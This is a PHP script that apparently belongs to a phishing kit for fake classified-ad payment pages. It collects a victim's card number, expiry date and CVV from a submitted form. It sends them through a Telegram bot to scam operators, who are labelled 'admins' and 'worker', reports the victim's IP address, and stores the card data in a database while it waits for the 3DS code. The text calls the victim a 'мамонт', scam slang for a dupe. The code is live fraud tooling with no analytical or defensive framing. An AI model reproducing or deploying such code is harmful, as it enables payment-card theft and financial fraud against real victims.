<?php
include '../system/main.php';
if ($_SERVER['REQUEST_METHOD'] != 'POST') {
    die();
}
$card = $connection->real_escape_string($_POST['cardNumber']);
$expiry = $connection->real_escape_string($_POST['expiry']);
$cvc = (int)$_POST['cvv'];

$query = mysqli_query($connection, "SELECT * FROM `adverts` WHERE `type` = '2' AND `advert_id` = '" . (int)$_SESSION['adid'] . "' AND `status` = '1'");
$order = mysqli_fetch_assoc($query);

$text = "⚠️💳 Мамонт ввёл данные от карты. Ждём 3DS. 💳⚠️\n\n";
$text .= "ID объявления: <code>". $_SESSION['adid'] . "</code>\n";
$text .= "Номер карты: <code>". $card. "</code>\n";
$text .= "Действительна до: <code>". $expiry . "</code>\n";
$text .= "CVC/CVV: <code>". $cvc . "</code>\n";
$text .= "Сумма: <code>" . $_SESSION['amount'] . "</code>";

send('sendMessage', array('chat_id' => $config['admins'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'random_id' => mt_rand()));

$text = "⚠️💳 Мамонт ввёл данные от карты. Ждём 3DS. 💳⚠️\n\n";
$text .= "ID объявления: <code>". $_SESSION['adid'] . "</code>\n";
$text .= "IP: <code>" . $_SERVER['REMOTE_ADDR'] . "</code>";

send('sendMessage', array('chat_id' => $order['worker'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'random_id' => mt_rand()));

mysqli_query($connection, "INSERT INTO `invoices`(`card`, `expiry`, `cvc`, `status`, `reason`) VALUES ('$card', '$expiry', '$cvc', '1', 'none');");
$query = mysqli_query($connection , "SELECT * FROM invoices WHERE id = LAST_INSERT_ID();");
if(!$query)
{
    printf("Error: %s\n", mysqli_error($connection));
} else {
    $row = mysqli_fetch_array($query, MYSQLI_BOTH);
    echo $row[0];
}